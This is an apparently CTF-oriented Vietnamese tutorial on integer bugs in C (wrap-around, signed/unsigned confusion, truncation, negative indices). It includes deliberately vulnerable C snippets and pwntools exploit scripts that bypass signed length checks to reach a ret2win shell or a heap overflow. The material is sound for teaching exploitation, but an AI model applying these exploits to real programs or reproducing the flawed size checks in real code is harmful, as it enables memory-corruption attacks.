Integer Bugs

Số nguyên trong máy có biên: 32-bit unsigned max = 0xffffffff. Vượt biên → wrap-around (quay vòng). Signed/unsigned lẫn lộn, truncation, hay cộng tràn làm một kiểm tra kích thước bị qua mặt → dẫn tới buffer overflow / OOB. Bài này: các mẫu bug số nguyên, số thật, dẫn tới khai thác.

Bài này nói về cái gì?

Wrap-around: uint32 0xffffffff + 1 = 0 (tràn), 0 − 1 = 0xffffffff (underflow). Số không "lớn vô hạn" — nó quay vòng.

Khai thác: một kiểm tra như if (len < SIZE) bị qua mặt khi len âm (signed) nhưng dùng làm size_t (unsigned → cực lớn), hoặc khi len+hdr tràn về số nhỏ. → copy/ghi quá biên → overflow/OOB.

Truncation: gán int (4 byte) vào short (2 byte) mất byte cao → giá trị đổi.

Nếu chỉ nhớ một điều: số nguyên quay vòng; dùng nó để qua mặt kiểm tra size → overflow/OOB.

⚡ COMBAT CARD — nhận bug & khai thác
🔎 Nhận dạng từ source 
int len; scanf("%d",&len);          // SIGNED
if (len < 100) read(0, buf, len);   // len=-1 → qua check, read(... (size_t)-1)
char n = user_int;                  // TRUNCATION int→char
size_t sz = a + b;                  // a+b tràn → sz nhỏ, malloc nhỏ, ghi lớn
🎯 Signed bypass

Nhập len = -1 (signed int). Check len < 100 → đúng (−1<100). Nhưng read(0, buf, len) dùng len làm size_t = 0xffffffffffffffff → đọc khổng lồ → overflow.

🎯 Addition overflow 
n = user (uint32); total = n + 16;
// user = 0xfffffff8 → total = 8 (tràn) → malloc(8) nhưng ghi n byte
🔢 Biên nhớ 
int8  : -128..127         uint8 : 0..255
int32 : -2^31..2^31-1     uint32: 0..0xffffffff
int64 : ...               size_t: uint64 (x86-64)
⚠️ Nhớ

So sánh signed vs size_t: C promote signed thành unsigned → số âm thành khổng lồ. Luôn soi KIỂU của biến len/size trong source/disasm (movsx vs movzx).

01 / NỀN TẢNG BẮT BUỘC

Số nguyên có biên & quay vòng

Máy tính lưu số nguyên trong số bit cố định (8/16/32/64). Khi phép tính vượt biên, kết quả quay vòng (modulo 2^n) — như đồng hồ 12 giờ: 11+2 = 1, không phải 13. unsigned: 0..2^n−1, quay vòng. signed: dùng bù-2, bit cao = dấu; 0x80000000 là số âm nhỏ nhất. Lỗi xảy ra khi lập trình viên quên biên này.

Định nghĩa nhanh

overflow (số)

Vượt max → quay về nhỏ.

underflow

Dưới 0 (unsigned) → về max.

signed/unsigned

Có dấu / không dấu.

truncation

Gán kiểu nhỏ hơn, mất byte cao.

size_t

unsigned 64-bit (kích thước).

bù-2

Cách lưu số âm.

02 / VÌ SAO CÓ KỸ THUẬT

Kiểm tra "an toàn" bị qua mặt

Lập trình viên thêm check kích thước (if (len < MAX)) để NGĂN overflow. Nhưng nếu len là signed và được dùng làm size (unsigned), hoặc một phép cộng tràn, thì check "đúng" mà giá trị thực lại nguy hiểm. Integer bug biến một lá chắn thành cửa hậu: nó không tự cho control, mà mở đường cho overflow/OOB. Rất phổ biến trong đề "có vẻ an toàn".

03 / CÁC MẪU · MỤC LÕI

Bốn mẫu kinh điển (số thật)

1

Signed length bypass

int len; scanf("%d", &len);
if (len > 0x100) return;        // chặn lớn
read(0, buf, len);               // len=-1 → qua check, read(0,buf, 0xff..ff)
// -1 > 0x100? KHÔNG (signed) → qua. read dùng size_t → đọc khổng lồ → overflow
2

Addition overflow

uint32_t n = user;               // vd 0xfffffff8
char *p = malloc(n + 8);          // 0xfffffff8+8 = 0 (tràn) → malloc(0)!
memcpy(p, src, n);               // ghi 0xfffffff8 byte vào chunk 0 → heap overflow
3

Truncation

int big = user;                  // 0x10041 (65601)
short small = big;               // = 0x0041 = 65 (mất byte cao!)
// check theo 'big' (lớn), dùng 'small' (nhỏ) → lệch
4

Array index âm

int i = user;
if (i < 10) arr[i] = x;          // i=-5 → arr[-5] = ghi TRƯỚC mảng (OOB)
04 / SIGNED vs UNSIGNED

Quy tắc promote của C

Khi so sánh/tính giữa signed và unsigned cùng cỡ, C chuyển signed thành unsigned. Nên -1 (int) thành 0xffffffff (uint). Đây là nguồn bug số 1:

int len = -1;
if (len < sizeof(buf))   // sizeof là size_t (unsigned)!
    ...                  // -1 → 0xffffffffffffffff, KHÔNG < sizeof(buf) → check FALSE?
// tùy chiều so sánh; thường làm check sai hướng → bug

Trong asm: movsx (sign-extend, giữ dấu) vs movzx (zero-extend). Thấy movsx khi load len rồi dùng làm size → nghi signed bug.

Dấu hiệu disasmcmp + jl/jg (signed jump) → so sánh signed. jb/ja (below/above) → unsigned. Lẫn lộn 2 loại quanh biến length = bug.

07 / EXPLOIT ĐẦY ĐỦ

Signed length → overflow → ret2win

// vuln.c — gcc vuln.c -o vuln -fno-stack-protector -no-pie
void win(){ system("/bin/sh"); }
int main(){
  char buf[0x40]; int len;
  scanf("%d", &len);
  if (len > 0x40) return 0;      // "chặn" overflow (nhưng signed!)
  read(0, buf, len);             // len=-1 → read(0,buf, 0xff..ff) → overflow
}
# BẢN A — nhập len=-1 để qua check, read đọc khổng lồ → overflow ret2win.
from pwn import *
exe = ELF("./vuln", checksec=False)
p = process(exe.path)

p.sendline(b"-1")                 # len = -1 → qua check (len > 0x40? không)
# read(0, buf, (size_t)-1) → ta gửi bao nhiêu cũng được → overflow
OFF = 72
payload = b"A"*OFF + p64(exe.sym.win)
p.sendline(payload)
p.interactive()
Thành thậtChiều so sánh & kiểu (int len, len > 0x40) là của binary mẫu. -1 là input kinh điển để qua check signed. OFF=72 dò cyclic. Kiểm KIỂU bằng disasm (movsx = signed).
# BẢN B — addition overflow: malloc nhỏ nhưng ghi lớn (heap).
# vuln: n = user; p = malloc(n+8); read(0, p, n);
from pwn import *
p = process("./vuln")
# n = 0xfffffff8 → malloc(0xfffffff8+8) = malloc(0) (tràn 32-bit)
# → chunk cực nhỏ, nhưng read 0xfffffff8 byte → heap overflow khổng lồ
p.sendline(str(0xfffffff8).encode())
p.send(b"A"*0x100)              # ghi tràn chunk kế → heap bug
# → nối tiếp heap exploitation (xem heap_bugs)
p.interactive()
Tràn cộngn+8 tràn 32-bit khi n gần max → kích thước malloc nhỏ bất ngờ. Chỉ xảy ra nếu biến là 32-bit (uint32). 64-bit khó tràn hơn (cần số cực lớn).
# BẢN C — pwnld.
from pwnld import *
exe = ELF("./vuln", checksec=False); p = start()
sl(b"-1")                     # qua check signed
sl(b"A"*72 + p64(exe.sym.win))
ia()
